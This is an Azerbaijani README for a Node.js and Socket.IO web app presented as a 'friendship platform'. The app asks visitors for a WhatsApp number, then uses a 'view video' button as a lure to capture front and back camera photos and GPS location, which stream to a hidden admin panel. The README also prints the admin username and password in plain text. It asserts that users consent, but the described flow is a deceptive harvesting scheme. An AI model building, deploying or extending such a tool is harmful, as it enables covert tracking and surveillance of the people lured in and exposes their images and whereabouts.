# Real-Time Dostluq Platforması

## Layihə Haqqında
Bu layihə dostlar arasında güvəni möhkəmləndirmək üçün yaradılmış real-time web tətbiqidir.

## Texnologiyalar
- **Backend**: Node.js + Express
- **Real-Time**: Socket.IO
- **Frontend**: Vanilla JavaScript + CSS3
- **Deployment**: Render.com

## Xüsusiyyətlər

### ✅ Tamamlanmış Funksiyalar
- ✅ İstifadəçi telefon nömrəsi daxiletməsi (+994 prefiksi)
- ✅ Real-time kamera icazəsi (önlü və arxalı)
- ✅ Canlı konum paylaşımı (GPS)
- ✅ Admin paneli (X düyməsi ilə giriş)
- ✅ Real-time məlumat əks olunması (Socket.IO)
- ✅ Güvənli autentifikasiya sistemi

### 🔐 Admin Girişi
- **İstifadəçi adı**: `618ursaursamajor`
- **Şifrə**: `618majorursa618`

Sol üst küncdəki **X** düyməsinə basaraq admin panelinə daxil ola bilərsiniz.

## API Endpointləri

### İstifadəçi Endpointləri
- `GET /` - Ana səhifə
- `POST /api/submit-data` - İstifadəçi məlumatlarını göndərmək

### Admin Endpointləri
- `POST /api/admin/login` - Admin girişi
- `GET /api/admin/data` - Bütün istifadəçi məlumatlarını əldə etmək

### Health Check
- `GET /health` - Server status

## Data Strukturu

### İstifadəçi Məlumatları
```json
{
  "phone": "501234567",
  "location": {
    "latitude": 40.4093,
    "longitude": 49.8671,
    "accuracy": 10
  },
  "frontImage": "data:image/jpeg;base64,...",
  "backImage": "data:image/jpeg;base64,...",
  "timestamp": "2026-02-21T10:30:00.000Z"
}
```

## Quraşdırma və İşə Salma

### Lokal İnkişaf
```bash
# Asılılıqları yüklə
npm install

# Serveri başlat
npm start

# URL: http://localhost:3000
```

### PM2 ilə İşə Salma
```bash
# PM2 ilə başlat
pm2 start ecosystem.config.cjs

# Logları yoxla
pm2 logs webapp --nostream

# Servisi yenidən başlat
pm2 restart webapp

# Servisi dayandır
pm2 stop webapp
```

## Render.com Deployment

### 1. Environment Variables
Render.com dashboardunda aşağıdakı dəyişənləri əlavə edin:
```
NODE_ENV=production
PORT=3000
```

### 2. Build Command
```bash
npm install
```

### 3. Start Command
```bash
npm start
```

## İstifadə Qaydası

### İstifadəçi Axını
1. İstifadəçi sayta daxil olur
2. WhatsApp nömrəsini daxil edir (+994 XX-XXX-XX-XX)
3. "Video Görüntülə" düyməsinə basır
4. Brauzer konum və kamera icazələri istəyir (REAL icazələr)
5. Məlumatlar real-time olaraq admin panelinə göndərilir

### Admin Axını
1. Sol üst küncdəki **X** düyməsinə bas
2. Giriş məlumatlarını daxil et
3. Bütün istifadəçi məlumatlarını real-time gör

## Texniki Detallar

### Kamera və Konum İcazələri
- **Kamera**: `navigator.mediaDevices.getUserMedia()` API-dən istifadə
- **Konum**: `navigator.geolocation.getCurrentPosition()` API-dən istifadə
- Hər iki icazə brauzerin native icazə sistemini istifadə edir

### Real-Time Bağlantı
Socket.IO ilə server və client arasında real-time bağlantı qurulur:
- Yeni məlumat daxil olanda admin panelinə dərhal göndərilir
- Bağlantı kəsilməsi avtomatik yenidən qurulur

## Layihə Strukturu
```
webapp/
├── server.js              # Express server və Socket.IO konfiqurasiyası
├── package.json           # NPM asılılıqlar və scriptlər
├── ecosystem.config.cjs   # PM2 konfiqurasiyası
├── public/
│   ├── index.html        # Ana HTML səhifə
│   ├── css/
│   │   └── style.css     # Bütün CSS stillər
│   ├── js/
│   │   └── app.js        # Client-side JavaScript
│   └── images/
│       └── striped_image.jpg  # Təsdiq şəkli
└── README.md
```

## Təhlükəsizlik
- Admin girişi şifrələnmiş
- Məlumatlar server yaddaşında saxlanır (production üçün verilənlər bazası tövsiyə olunur)
- CORS konfiqurasiyası mövcuddur

## Tövsiyə Olunan Təkmilləşdirmələr
- 🔄 Verilənlər bazası inteqrasiyası (MongoDB/PostgreSQL)
- 🔒 JWT token əsaslı autentifikasiya
- 📧 Email bildirişləri
- 📊 Statistika və analitika
- 💾 Məlumatların eksportu (CSV/Excel)

## Deploy Status
- **Platform**: Lokal/Sandbox (Render.com üçün hazır)
- **Status**: ✅ Aktiv
- **Son Yeniləmə**: 2026-02-21

## Qeydlər
- Bu layihə yalnız dostlar qrupu üçün nəzərdə tutulub
- Bütün iştirakçılar məqsəddən xəbərdardır
- İcazələr real brauzer API-ləri ilə toplanır

---
**Diqqət**: Bu layihə etik məqsədlər üçün yaradılıb və yalnız razılıq vermiş istifadəçilər üçün nəzərdə tutulub.
